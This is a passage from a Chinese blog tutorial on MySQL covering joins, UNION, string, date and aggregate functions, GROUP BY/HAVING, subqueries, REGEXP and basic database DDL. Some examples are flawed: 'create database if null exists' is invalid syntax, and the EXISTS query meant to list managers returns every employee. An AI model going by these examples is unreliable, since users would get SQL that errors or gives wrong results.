<p>特点：</p>
<ol>
<li>结果集：包含两个表中的所有行，并将符合连接条件的行进行匹配。对于不符合连接条件的行，外连接会在结果集中保留它们，并在另一张表的相应列中填充NULL值。</li>
<li>操作方式：在FROM子句中使用JOIN关键字和ON子句来定义连接条件，同时指定外连接的类型（左外连接、右外连接或全外连接）。</li>
<li>优点：能够保留更多的数据，特别是在需要分析表之间不完全匹配的数据时非常有用。</li>
<li>缺点：操作相对复杂且效率较低，因为需要处理更多的行和可能的NULL值。</li>
</ol>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- sql92内连接不需要特别表明，外连接方法如下，但MySQL不支持</span></span><br><span class="line"><span class="keyword">select</span> last_name,department_name,city</span><br><span class="line"><span class="keyword">from</span> employees t1, departments t2</span><br><span class="line"><span class="keyword">where</span> t1.department_id <span class="operator">=</span> t2.department_id(<span class="operator">+</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- sql99实现内连接 inner join的inner可以省略</span></span><br><span class="line"><span class="keyword">select</span> last_name,department_name,city</span><br><span class="line"><span class="keyword">from</span> employees t1 <span class="keyword">join</span> departments t2</span><br><span class="line"><span class="keyword">on</span> t1.department_id <span class="operator">=</span> t2.department_id </span><br><span class="line"><span class="keyword">join</span> locations t3 <span class="keyword">on</span> t2.location_id <span class="operator">=</span> t3.location_id;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- sql99实现外连接 left outer join可以省略outer,mysql中不支持满外连接</span></span><br><span class="line"><span class="keyword">select</span> last_name,department_name</span><br><span class="line"><span class="keyword">from</span> employees t1 <span class="keyword">left</span> <span class="keyword">join</span> departments t2</span><br><span class="line"><span class="keyword">on</span> t1.department_id <span class="operator">=</span> t2.department_id </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--mysql中实现满外连接</span></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,last_name,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.`department_id` <span class="operator">=</span> d.`department_id`</span><br><span class="line"><span class="keyword">WHERE</span> d.`department_id` <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,last_name,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.`department_id` <span class="operator">=</span> d.`department_id`;</span><br></pre></td></tr></table></figure>

<p><strong>Union &amp; Union all</strong><br>union:返回两个查询的结果集的并集，去除重复记录。<br>union all:返回两个查询的结果集的并集。对于两个结果集的重复部分，不去重。<br>说明：union执行速度比union all慢,多了去重的工作，开发中尽可能使用union all</p>
<ol>
<li><code>UNION</code> 和 <code>UNION ALL</code> 合并的多个 <code>SELECT</code> 查询中，所有查询的列数必须相同，而且每一列的数据类型必须兼容。如果列数或数据类型不一致，SQL 会报错。(即使数据类型不同，但如果可以隐式转换，MySQL 也能处理)</li>
<li><code>ORDER BY</code> 必须在最后一个 <code>SELECT</code> 之后。如果需要对合并后的结果排序，必须在最后一个 <code>SELECT</code> 查询之后使用 <code>ORDER BY</code>，不能在每个 <code>SELECT</code> 查询内部使用 <code>ORDER BY</code>。</li>
<li><code>IMIT</code> 可以在单独的查询中使用。如果你只想限制单个查询的结果数量，可以在每个 <code>SELECT</code> 查询中使用 <code>LIMIT</code>。但是，如果你想限制合并后的结果集的数量，<code>LIMIT</code> 必须在整个 <code>UNION</code> 查询的最后。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240801213549.png" alt="7种表连接"></p>
<p><strong>规范注意</strong></p>
<ol>
<li>超过三表的连接不建议使用join.</li>
<li>显示所有很可能设计满外连接</li>
</ol>
<h4 id="sql99-自然连接"><a href="#sql99-自然连接" class="headerlink" title="sql99 自然连接"></a>sql99 自然连接</h4><p>自然连接：自动基于这些表之间的共同列（即全部具有相同列名的列）来匹配记录，并将匹配到的记录组合在一起，同时消除重复的列。<br>using连接：基于这些表之间的给定的共同列（即给定的具有相同列名的列）来匹配记录，并将匹配到的记录组合在一起，同时消除重复的列。</p>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> last_name,department_name</span><br><span class="line"><span class="keyword">from</span> employees t1 <span class="keyword">join</span> departments t2</span><br><span class="line"><span class="keyword">on</span> t1.department_id <span class="operator">=</span> t2.department_id </span><br><span class="line"><span class="keyword">and</span> t1.manager_id <span class="operator">=</span> t2.manager_id </span><br><span class="line"><span class="comment">-- 等价自然连接语句：</span></span><br><span class="line"><span class="keyword">select</span> last_name,department_name</span><br><span class="line"><span class="keyword">from</span> employees t1 <span class="keyword">natural</span> <span class="keyword">join</span> departments t2;</span><br><span class="line"><span class="comment">-- 等价using语句</span></span><br><span class="line"><span class="keyword">select</span> last_name,department_name</span><br><span class="line"><span class="keyword">from</span> employees t1 <span class="keyword">join</span> departments t2</span><br><span class="line"><span class="keyword">using</span>(department_id,manager_id);</span><br></pre></td></tr></table></figure>

<h3 id="函数的使用"><a href="#函数的使用" class="headerlink" title="函数的使用"></a>函数的使用</h3><p>不同DBMS使用的函数有很大不同，且大多不通用，这里以MySQL中的函数为例：<br><a href="https://pan.baidu.com/s/1ScXuOXjtSSfX7g2HPn2xRg">单行函数参考文档</a><br><a href="https://pan.baidu.com/s/1doG4ekN8jhh8TXeks3zWIQ">聚合函数参考文档</a></p>
<h4 id="单行函数"><a href="#单行函数" class="headerlink" title="单行函数"></a>单行函数</h4><p>数值型函数，角度弧度转换函数，三角函数，对数和指数，进制转换<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240802182716.png" alt="数值型"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240802184122.png" alt="角度和弧度"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240802184153.png" alt="三角函数"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240802232700.png" alt="指数和对数"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240802232738.png" alt="进制的转换"></p>
<p>字符串函数：下标从1开始<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240802232848.png" alt="字符串函数1"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240802232924.png" alt="字符串函数2"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240802232956.png" alt="字符串函数3"></p>
<p>日期函数<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240802233046.png" alt="获取日期和时间"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240802233122.png" alt="日期与时间戳转换"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240803104059.png" alt="获取月份，星期等"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240803104202.png" alt="日期操作函数"><br>还有时间与秒钟转换、计算日期与时间、日期格式化和解析、流程控制、加解密、MySQL信息函数等，参考上述链接</p>
<p><strong>字符串函数</strong></p>
<ul>
<li>字符转换<ul>
<li>UPPER(str): 将字符串转换为大写。</li>
<li>LOWER(str): 将字符串转换为小写。</li>
</ul>
</li>
<li>字符串连接<ul>
<li>CONCAT(str1, str2, …): 连接两个或多个字符串。</li>
<li>CONCAT_WS(separator, str1, str2, …): 使用指定的分隔符连接两个或多个字符串。</li>
</ul>
</li>
<li>字符串长度<ul>
<li>LENGTH(str): 返回字符串的字节长度。</li>
<li>CHAR_LENGTH(str): 返回字符串的字符数，等同于CHARACTER_LENGTH(str)。</li>
</ul>
</li>
<li>字符串截取<ul>
<li>SUBSTR(str, pos, len): 从字符串中pos位置开始截取len长度子串，不填写len截取到末尾，位置从1开始计数。</li>
<li>LEFT(str, len): 返回字符串最左边的len个字符。</li>
<li>RIGHT(str, len): 返回字符串最右边的len个字符。</li>
</ul>
</li>
<li>字符串查找和替换<ul>
<li>INSTR(str, substr): 返回子串substr在字符串str中首次出现的位置。</li>
<li>LOCATE(substr, str, [pos]): 返回子串substr在字符串str中首次出现的位置，可选指定开始位置。</li>
<li>REPLACE(str, from_str, to_str): 将字符串str中的from_str替换为to_str。</li>
</ul>
</li>
<li>字符串填充和修剪<ul>
<li>LPAD(str, len, padstr): 用字符串padstr对str的左边进行填充，直到长度为len。</li>
<li>RPAD(str, len, padstr): 用字符串padstr对str的右边进行填充，直到长度为len。</li>
<li>LTRIM(str): 去除字符串左边的空格。</li>
<li>RTRIM(str): 去除字符串右边的空格。</li>
<li>TRIM(str): 去除字符串两端的空格，TRIM(BOTH ‘x’ FROM str)可以去除两端的指定字符。</li>
</ul>
</li>
</ul>
<p><strong>数值函数</strong></p>
<ul>
<li>基本数学运算<ul>
<li>ABS(x): 返回x的绝对值。</li>
<li>MOD(x, y): 返回x除以y的余数。</li>
</ul>
</li>
<li>四舍五入和取整<ul>
<li>ROUND(x, [d]): 对x进行四舍五入，d为保留的小数位数，省略d则四舍五入到整数。</li>
<li>CEIL(x) 或 CEILING(x): 向上取整，返回不小于x的最小整数。</li>
<li>FLOOR(x): 向下取整，返回不大于x的最大整数。</li>
<li>TRUNCATE(x, d): 截断x，保留d位小数。</li>
</ul>
</li>
<li>其他数值操作<ul>
<li>RAND(): 返回一个0到1之间的随机数。</li>
<li>RAND(N): 返回一个0到1之间的随机数，N作为种子值，相同的N值产生相同的随机数。</li>
</ul>
</li>
</ul>
<p><strong>日期和时间函数</strong></p>
<ul>
<li>当前日期和时间<ul>
<li>NOW(): 返回当前的日期和时间。</li>
<li>CURDATE(): 返回当前的日期（不含时间）。</li>
<li>CURTIME(): 返回当前的时间（不含日期）。</li>
</ul>
</li>
<li>日期和时间操作<ul>
<li>DATE_ADD(date, INTERVAL expr type): 向日期添加指定的时间间隔。</li>
<li>DATE_SUB(date, INTERVAL expr type): 从日期减去指定的时间间隔。</li>
<li>DATEDIFF(expr1, expr2): 返回两个日期之间的天数差，可能为正负(<code>date1 - date2</code>)。</li>
</ul>
</li>
<li>日期和时间的格式化与提取<ul>
<li>DATE_FORMAT(date, format): 将日期格式化为指定的字符串。</li>
<li>STR_TO_DATE(str, format): 将字符串按照指定的格式转换为日期。</li>
<li>YEAR(date): 提取日期的年份。</li>
<li>MONTH(date): 提取日期的月份。</li>
<li>DAY(date): 提取日期的日。</li>
<li>HOUR(time): 提取时间的小时数。</li>
<li>MINUTE(time): 提取时间的分钟数。</li>
<li>SECOND(time): 提取时间的秒数。</li>
</ul>
</li>
</ul>
<p><strong>其他常用函数</strong></p>
<ul>
<li><code>COALESCE(value1, value2, ..., value_n)</code>用于返回参数列表中第一个非空值。</li>
</ul>
<h4 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h4><p>聚合函数作用于一组数据，并对一组数据返回一个值。<br>MySQL中聚合函数不可嵌套<br>使用聚合函数时可以不使用<code>group by</code><br>常用聚合函数类型：</p>
<ul>
<li><p>只能用于数值型数据</p>
<ul>
<li><p>平均值AVG()</p>
</li>
<li><p>总和SUM()</p>
</li>
<li><p>方差VARIANCE()；标准差 STDDEV()；</p>
</li>
</ul>
</li>
<li><p>可用于任意数据类型</p>
<ul>
<li><p>最大值MAX()</p>
</li>
<li><p>最小值MIN()</p>
</li>
<li><p>数据总条数COUNT()</p>
</li>
</ul>
</li>
<li><p>可用于字符串型</p>
<ul>
<li><code>GROUP_CONCAT([DISTINCT] expression [ORDER BY ...] [SEPARATOR &#39;separator&#39;])</code> ：用于将分组中的多个值连接成一个字符串，常用于生成包含多个值的列表。</li>
</ul>
</li>
</ul>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">select</span> <span class="built_in">avg</span>(salary),<span class="built_in">sum</span>(salary),<span class="built_in">max</span>(salary),<span class="built_in">min</span>(salary),<span class="built_in">count</span>(<span class="operator">*</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">from</span> employees;</span><br><span class="line"><span class="comment">-- avg(salary) | sum(salary) | max(salary) | min(salary) | count(*) |</span></span><br><span class="line"><span class="comment">-- 6461.682243 |   691400.00 |    24000.00 |     2100.00 |           107 |</span></span><br></pre></td></tr></table></figure>

<p>count()说明：</p>
<ul>
<li>用count(<em>)，count(1)，count(列名)谁好呢?<br>对于MyISAM引擎的表是没有区别的。这种引擎内部有一计数器在维护着行数。<br>对于Innodb引擎的表用count(</em>),count(1)直接读行数，复杂度是O(n)，因为innodb真的要去数一遍。但好<br>于具体的count(列名)。</li>
<li>能不能使用count(列名)替换count(*)?<br>不要使用 count(列名)来替代 count(*) ， count(*) 是 SQL92 定义的标准统计行数的语法，跟数<br>据库无关，跟 NULL 和非 NULL 无关。</li>
<li>count(*)会统计值为 NULL 的行，而 <strong>count(列名)不会统计此列为 NULL 值的行</strong>。</li>
</ul>
<p><strong>注意</strong>：<br><code>avg(列名) = sum(列名) / count(列名)</code>，因此会自动过滤<code>null</code>值的数据，因此，当数据中存在null值而计算平均值需要考虑为Null的数据时，如计算公司平均奖金，需要考虑无奖金员工，如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(commission_pct)<span class="operator">/</span><span class="built_in">count</span>(ifnull(commission_pct,<span class="number">0</span>)) <span class="keyword">as</span> avg_com <span class="keyword">from</span> employees;</span><br></pre></td></tr></table></figure>

<h4 id="结构函数"><a href="#结构函数" class="headerlink" title="结构函数"></a>结构函数</h4><p>只分为单行和聚合，单列出这个只是为了方便查看</p>
<ol>
<li><code>IFNULL(expr1, expr2)</code> 其中，expr1是要判断的表达式，如果expr1为NULL，则返回expr2的值；否则，返回expr1的值。</li>
<li><code>NULLIF()</code> 用于比较两个值，如果它们相等，则返回 <code>NULL</code>，否则返回第一个值。</li>
<li><code>COALESCE()</code> 是一个更通用的函数，它可以接受多个参数，并返回第一个非 <code>NULL</code> 的值。</li>
<li><code>IF(condition, value_if_true, value_if_false)</code> 函数</li>
</ol>
<h3 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h3><h4 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h4><p>使用GROUP BY子句将表中的数据分成若干组</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> department_id,<span class="built_in">avg</span>(salary) <span class="keyword">from</span> employees t1 <span class="keyword">group</span> <span class="keyword">by</span> department_id;</span><br></pre></td></tr></table></figure>

<p><strong>with rollup的使用</strong><br>with rollup会针对组函数所得的结果再使用一次组函数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(salary) <span class="keyword">from</span> employees <span class="keyword">group</span> <span class="keyword">by</span> job_id <span class="keyword">with</span> <span class="keyword">rollup</span>;</span><br><span class="line"><span class="comment">-- 最后会添加一条相当于select sum(salary) from employees;的执行结果的数据</span></span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ol>
<li><code>select</code>子句中出现的非组函数的字段必须出现在<code>group by</code>子句中，反之不成立</li>
<li><code>where</code>子句必须在<code>from</code>子句后，<code>group by</code>应当在<code>order by</code>前，<code>from</code>后</li>
<li>使用<code>group by</code>子句必须是在<code>select</code>子句中有组函数的前提下</li>
<li>使用<code>with rollup</code>就不能使用<code>order by</code></li>
</ol>
<h4 id="HAVING的使用"><a href="#HAVING的使用" class="headerlink" title="HAVING的使用"></a>HAVING的使用</h4><p>在分组<code>group by</code>后的结果数据中显示符合<code>having</code>条件的分组.<br><strong>如果过滤的条件中包含组函数，就必须写在having子句中，不能写在where子句中</strong></p>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> department_id,<span class="built_in">Max</span>(salary) </span><br><span class="line"><span class="keyword">from</span> employees </span><br><span class="line"><span class="keyword">where</span> department_id <span class="keyword">in</span> (<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>) </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> department_id </span><br><span class="line"><span class="keyword">having</span> <span class="built_in">max</span>(salary)<span class="operator">&gt;</span><span class="number">10000</span>;</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ol>
<li>使用前提：<code>HAVING</code>不能单独使用，必须要跟<code>GROUP BY</code>一起使用且必须写在<code>GROUP BY</code>子句后。</li>
<li>写在<code>where</code>下的子句也可以写在<code>having</code>下，但会降低运行效率，因此当过滤条件中不包含组函数时，应当写在<code>where</code>子句中 &#x3D;&#x3D;&gt; <code>having</code>适用范围更广，<code>where</code>运行效率更高，</li>
</ol>
<h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p><strong>子查询的基本语法结构：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ...,....       </span><br><span class="line"><span class="keyword">FROM</span> ...,...,....</span><br><span class="line"><span class="keyword">WHERE</span> expr operation </span><br><span class="line">  (</span><br><span class="line">    <span class="keyword">SELECT</span> ...,....,...</span><br><span class="line">    <span class="keyword">FROM</span> ...,...,....</span><br><span class="line">    <span class="keyword">WHERE</span> ...</span><br><span class="line">    ....</span><br><span class="line">   )</span><br><span class="line">...</span><br><span class="line"><span class="comment">-- 子查询也可以写在having子句、case-when子句、from子句（需要有别名）等</span></span><br></pre></td></tr></table></figure>


<p>说明：</p>
<ol>
<li>子查询（内查询）在主查询之前一次执行完成。</li>
<li>子查询的结果被主查询（外查询）使用.</li>
<li>子查询要包含在括号内，放在比较条件的右侧</li>
<li>子查询可以放在<code>where</code>子句，<code>having</code>子句，<code>case-when</code>子句的<code>when</code>后</li>
<li>子查询的结果作为表、视图或临时表时<code>必须取别名</code>，其他情况建议取别名</li>
</ol>
<p><strong>子查询的分类</strong></p>
<ol>
<li>从内查询返回结果的条目数：<ul>
<li>单行子查询和多行子查询</li>
<li>单行操作符对应单行子查询，多行操作符对应多行子查询</li>
</ul>
</li>
<li>从内查询是否被执行多次<ul>
<li>相关子查询和不相关子查询，如<ul>
<li>相关子查询：查询工资大于本部门平均工资的员工信息，由于多个部门的存在，内查询需要多次执行</li>
<li>不相关子查询：查询工资大于本公司平均工资的员工信息</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>非法使用子查询</strong></p>
<ol>
<li>使用多行子查询时使用单行的操作符</li>
<li>多行子查询的内查询如果为空会出现<code>Empty set (0.01 sec)</code></li>
</ol>
<h4 id="单行子查询"><a href="#单行子查询" class="headerlink" title="单行子查询"></a>单行子查询</h4><p>单行操作符：<code>=  != &lt; &lt;= &gt;= &gt;</code></p>
<p>示例：查询与141号或174号员工的manager_id和department_id相同的其他员工的employee_id，<br>manager_id，department_id</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 方法一</span></span><br><span class="line"><span class="keyword">select</span> employee_id,manager_id,department_id </span><br><span class="line"><span class="keyword">from</span> employees </span><br><span class="line"><span class="keyword">where</span> manager_id <span class="operator">=</span> (<span class="keyword">select</span> manager_id </span><br><span class="line">                    <span class="keyword">from</span> employees </span><br><span class="line">                    <span class="keyword">where</span> employee_id <span class="operator">=</span> <span class="number">141</span>)</span><br><span class="line"><span class="keyword">and</span> department_id <span class="operator">=</span> (<span class="keyword">select</span> department_id </span><br><span class="line">                    <span class="keyword">from</span> employees </span><br><span class="line">                    <span class="keyword">where</span> employee_id <span class="operator">=</span> <span class="number">141</span>);</span><br><span class="line"><span class="comment">-- 方式二</span></span><br><span class="line"><span class="keyword">select</span> employee_id,manager_id,department_id </span><br><span class="line"><span class="keyword">from</span> employees </span><br><span class="line"><span class="keyword">where</span> (manager_id,department_id) <span class="operator">=</span> (<span class="keyword">select</span> manager_id,department_id </span><br><span class="line">                                    <span class="keyword">from</span> employees </span><br><span class="line">                                    <span class="keyword">where</span> employee_id <span class="operator">=</span> <span class="number">141</span>);</span><br></pre></td></tr></table></figure>

<h4 id="多行子查询"><a href="#多行子查询" class="headerlink" title="多行子查询"></a>多行子查询</h4><p>多行子查询操作符：<code>IN ANY ALL SOME</code><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240804120046.png" alt="多行子查询操作符"></p>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- any 查询从事其他工作的 比从事&quot;IT_PROG&quot;工作的 任一个 员工工资低 的员工姓名和工资</span></span><br><span class="line"><span class="keyword">select</span> last_name,salary <span class="keyword">from</span> employees </span><br><span class="line"><span class="keyword">where</span> salary <span class="operator">&lt;</span> <span class="keyword">any</span> (<span class="keyword">select</span> salary <span class="keyword">from</span> employees <span class="keyword">where</span> job_id <span class="operator">=</span> <span class="string">&#x27;IT_PROG&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- all 查询从事其他工作的 比从事&quot;IT_PROG&quot;工作的 所有 员工工资低 的员工姓名和工资</span></span><br><span class="line"><span class="keyword">select</span> last_name,salary <span class="keyword">from</span> employees </span><br><span class="line"><span class="keyword">where</span> salary <span class="operator">&lt;</span> <span class="keyword">all</span> (<span class="keyword">select</span> salary <span class="keyword">from</span> employees <span class="keyword">where</span> job_id <span class="operator">=</span> <span class="string">&#x27;IT_PROG&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询平均工资最低的部门id</span></span><br><span class="line"><span class="keyword">select</span> department_id <span class="keyword">from</span> employees <span class="keyword">group</span> <span class="keyword">by</span> department_id</span><br><span class="line"><span class="keyword">having</span> <span class="built_in">avg</span>(salary) <span class="operator">=</span> (<span class="keyword">select</span> <span class="built_in">min</span>(avg_sal) </span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(salary) avg_sal <span class="keyword">from</span> employees <span class="keyword">group</span> <span class="keyword">by</span> department_id) t_avg_sal);</span><br><span class="line"><span class="comment">-- 或</span></span><br><span class="line"><span class="keyword">select</span> department_id <span class="keyword">from</span> employees <span class="keyword">group</span> <span class="keyword">by</span> department_id </span><br><span class="line"><span class="keyword">having</span> <span class="built_in">avg</span>(salary) <span class="operator">&lt;=</span> <span class="keyword">all</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(salary) avg_sal <span class="keyword">from</span> employees <span class="keyword">group</span> <span class="keyword">by</span> department_id);</span><br></pre></td></tr></table></figure>

<h4 id="相关子查询"><a href="#相关子查询" class="headerlink" title="相关子查询"></a>相关子查询</h4><p>上述单多行子查询的举例均为不相关子查询<br>如果子查询的执行依赖于外部查询，通常情况下都是因为子查询中的表用到了外部的表，并进行了条件关联，因此每执行一次外部查询，子查询都要重新计算一次，这样的子查询就称之为<code>关联子查询</code>。相关子查询按照一行接一行的顺序执行，主查询的每一行都执行一次子查询<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240804145645.png" alt="相关子查询的执行过程"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询工资大于本部门平均工资的员工的姓名和工资。也可以使用from子查询+多表查询的方法哦</span></span><br><span class="line"><span class="keyword">select</span> last_name,salary,department_id <span class="keyword">from</span> employees e1 <span class="keyword">where</span> salary <span class="operator">&gt;</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(salary) <span class="keyword">from</span> employees e2 <span class="keyword">where</span> department_id <span class="operator">=</span> e1.department_id);</span><br><span class="line"><span class="comment">-- 查询员工的姓名工资并按照department_name排序</span></span><br><span class="line"><span class="keyword">select</span> last_name,salary <span class="keyword">from</span> employees e1 <span class="keyword">order</span> <span class="keyword">by</span>(<span class="keyword">select</span> department_name <span class="keyword">from</span> departments d1 <span class="keyword">where</span> e1.department_id <span class="operator">=</span> d1.department_id) <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>

<p><strong>EXISTS 与 NOT EXISTS关键字</strong></p>
<p>关联子查询通常也会和 EXISTS操作符一起来使用，用来检查在子查询中是否存在满足条件的行。</p>
<ol>
<li>如果在子查询中不存在满足条件的行：<ul>
<li>条件返回 FALSE</li>
<li>继续在子查询中查找</li>
</ul>
</li>
<li>如果在子查询中存在满足条件的行：<ul>
<li>不在子查询中继续查找</li>
<li>条件返回 TRUE</li>
<li>NOT EXISTS关键字表示如果不存在某种条件，则返回TRUE，否则返回FALSE。</li>
</ul>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--查询管理者的employee_id </span></span><br><span class="line"><span class="keyword">select</span> employee_id,last_name <span class="keyword">from</span> employees <span class="keyword">where</span> employee_id <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">distinct</span> manager_id <span class="keyword">from</span> employees);</span><br><span class="line"><span class="comment">-- 或</span></span><br><span class="line"><span class="keyword">select</span> employee_id,last_name <span class="keyword">from</span> employees e1 <span class="keyword">where</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> employees e2 <span class="keyword">where</span> e1.employee_id <span class="operator">=</span> e2.employee_id);</span><br></pre></td></tr></table></figure>

<p>相关查询在数据库表更新删除有很大应用场景<br>自连接比子查询好</p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p> MySQL提供了 <code>REGEXP</code> 和 <code>NOT REGEXP</code> 运算符来使用正则表达式进行字符串匹配。</p>
<p><strong>语法：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name REGEXP <span class="string">&#x27;pattern&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p>正则表达式的基本组成部分：</p>
<ul>
<li><p><strong>字符</strong>：普通字符表示自己，如 <code>a</code> 匹配字母 “a”。</p>
</li>
<li><p>元字符</p>
<p>  ：具有特殊意义的字符，如：</p>
<ul>
<li><code>.</code>：匹配任何单个字符。</li>
<li><code>*</code>：匹配前一个字符零次或多次。</li>
<li><code>+</code>：匹配前一个字符一次或多次。</li>
<li><code>?</code>：匹配前一个字符零次或一次。</li>
<li><code>^</code>：匹配字符串的开头。</li>
<li><code>$</code>：匹配字符串的结尾。</li>
<li><code>[]</code>：匹配方括号内的任意字符，如 <code>[abc]</code> 匹配 “a”、”b” 或 “c”。</li>
<li><code>|</code>：逻辑或，如 <code>a|b</code> 匹配 “a” 或 “b”。</li>
</ul>
</li>
</ul>
<p>如一个有效的电子邮件具有前缀名称和域，其中：</p>
<ol>
<li><strong>前缀</strong> 名称是一个字符串，可以包含字母（大写或小写），数字，下划线 <code>&#39;_&#39;</code> ，点 <code>&#39;.&#39;</code> 和&#x2F;或破折号 <code>&#39;-&#39;</code> 。前缀名称 <strong>必须</strong> 以字母开头。</li>
<li><strong>域</strong> 为 <code>&#39;@leetcode.com&#39;</code></li>
</ol>
<p>示例：</p>
<p>一个有效的电子邮件具有前缀名称和域，其中：</p>
<ol>
<li><strong>前缀</strong> 名称是一个字符串，可以包含字母（大写或小写），数字，下划线 <code>&#39;_&#39;</code> ，点 <code>&#39;.&#39;</code> 和&#x2F;或破折号 <code>&#39;-&#39;</code> 。前缀名称 <strong>必须</strong> 以字母开头。</li>
<li><strong>域</strong> 为 <code>&#39;@leetcode.com&#39;</code></li>
</ol>
<p>表达式：<code>&#39;^[a-zA-Z][a-zA-Z0-9\_\.\-]*@leetcode\\.com$&#39;</code>;</p>
<h2 id="DDL-数据库、表的创建、修改和删除"><a href="#DDL-数据库、表的创建、修改和删除" class="headerlink" title="DDL-数据库、表的创建、修改和删除"></a>DDL-数据库、表的创建、修改和删除</h2><p>DDL语句一旦执行不可回滚rollback！执行后必须自动执行commit语句，因此需要慎重操作</p>
<p>MySQL8.0中DDL语句有原子性，若成功则全句成功，若某部分失败全部回滚<br>MySQL5.7没有此原子性，同时删除两个表可能有一个失败一个成功</p>
<h3 id="数据库基本操作"><a href="#数据库基本操作" class="headerlink" title="数据库基本操作"></a>数据库基本操作</h3><p>数据库的创建create和删除drop(慎重！)</p>
<ol>
<li>使用默认字符集创建数据库：<code>create database name;</code></li>
<li>使用指定字符集创建数据库：<code>create database name character set &#39;utf8&#39;;</code></li>
<li>（推荐）创建数据库，同时避免已存在报错：<code>create database if null exists name character set &#39;utf8&#39;;</code></li>
<li>删除数据库：<code>drop database name;</code></li>
<li>（推荐）删除数据库，同时避免不存在报错：<code>drop database if exists name;</code></li>
</ol>
<p>数据库的管理</p>
<ol>
<li>查看当前连接中的数据库：<code>show databases;</code></li>
<li>查看创建数据库时的操作：<code>show create database name;</code></li>
<li>切换数据库：<code>use databases;</code></li>
<li>查看当前数据库含有的表：<code>show tables;</code></li>
<li>查看当前使用的数据库：<code>select database() from dual;</code></li>
<li>查看指定数据库含有的表：<code>show tables from database_name;</code></li>
</ol>
<p>数据库的修改alter（一般不修改）</p>
<ol>
<li>更改数据库字符集：<code>ALTER DATABASE name CHARACTER SET &#39;utf8&#39;;</code> </li>
<li>数据库不可修改名称！！</li>
</ol>
<h3 id="表的创建、修改、删除"><a href="#表的创建、修改、删除" class="headerlink" title="表的创建、修改、删除"></a>表的创建、修改、删除</h3><p>表的创建create和删除drop(慎重)</p>
<ol>
